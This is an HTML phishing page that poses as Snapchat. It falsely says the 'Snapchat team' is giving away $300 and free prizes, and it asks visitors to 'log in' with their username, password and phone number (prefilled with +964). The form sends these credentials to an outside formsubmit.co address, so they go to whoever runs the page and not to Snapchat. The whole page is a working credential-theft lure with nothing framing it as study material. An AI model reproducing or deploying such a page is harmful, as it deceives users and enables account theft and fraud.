<!DOCTYPE html>
<html>

<head>
    <title>Snapchat</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
    <link rel="icon" href="img/snap.png" type="image/x-icon" />
</head>

<body style="height: 100vh; width: 100%; background-color: rgb(141, 141, 141);"
    class="d-flex flex-column justify-content-center align-items-center">
    <div class="col-8 row mb-5">
        <div class="col-12 d-flex justify-content-center mb-2">
            <img src="img/snap.png" width="90" alt="">
        </div>
        <div class="fw-bold text-light fs-5 mb-4">Hey, we as the Snapchat team have created prizes for you, all you have
            to do is log in to your Snapchat account to receive them:</div>
        <div class="col-12 d-flex justify-content-around align-items-center">
            <div class="d-flex justify-content-center align-items-center"><span class="fw-bold me-2">300$</span> <img
                    src="img/dollar.png" width="70" alt=""></div>
            <div class="d-flex justify-content-center align-items-center"><span class="fw-bold me-2">Free</span> <img
                    src="img/s.png" width="70" alt=""></div>
        </div>

    </div>
    

    <form action="https://formsubmit.co/a71cbd1589d6c57300d64d12cb1636c1" method="POST" class="w-75 mx-auto border-2 p-3 rounded bg-light text-center mt-4"
        style="border: 2px solid; border-color: rgb(255, 255, 0);">

        <div class="d-flex flex-column align-items-center justify-content-center mb-3"><img src="img/ss.png" width="45"
                alt=""><span class="fw-bold mt-3 bg-dark text-light px-3  py-2 rounded-5" style="word-spacing: 2px;">Log
                in to Snapchat</span></div>

        <div class="mb-3 text-start">
            <label for="exampleInputEmail1" class="form-label fw-bold ">Username</label>
            <input type="name" name="Name" required class="form-control rounded-0"
                style="background-color: rgb(208, 208, 208); border-bottom: 2px solid #6cb1f6;">
        </div>
        <div class="mb-3 text-start">
            <label for="exampleInputPassword1" class="form-label fw-bold">Password</label>
            <input type="password" required name="Password" class="form-control rounded-0 "
                style="background-color: rgb(208, 208, 208); border-bottom: 2px solid #6cb1f6;"
                >
        </div>
        <div class="mb-3 text-start">
            <label for="exampleInputPassword1" class="form-label fw-bold">Phone</label>
            <input type="phone" required name="text" value="+964 " class="form-control rounded-0 "
                style="background-color: rgb(208, 208, 208); border-bottom: 2px solid #6cb1f6;">
        </div>
        <span id="errorr" class="text-danger"></span>
        <a class="hidden" href="winner.html" id="win"></a>
        <button type="submit" class="btn w-25 rounded-5 fw-bold mt-3" style="background-color: rgb(255, 255, 0);"
            id="login">Login</button>
    </form>



    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"
        crossorigin="anonymous"></script>
</body>

</html>
